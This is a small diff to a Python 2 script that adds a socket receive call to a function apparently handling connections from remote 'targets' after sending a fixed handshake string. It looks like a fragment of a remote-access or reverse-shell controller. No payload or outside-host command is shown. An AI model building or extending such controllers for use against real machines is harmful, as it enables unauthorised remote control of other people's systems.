@@ -54,6 +54,7 @@ def acpt():
 def cmd():
     try:
         conn.send("9j3b3k8")
+        conn.recv(1024)
         print "====== OPEN CONNECTION ======="
         print "%d: Target Connection: %s" % (i, addr)
         print conn.recv(1024)
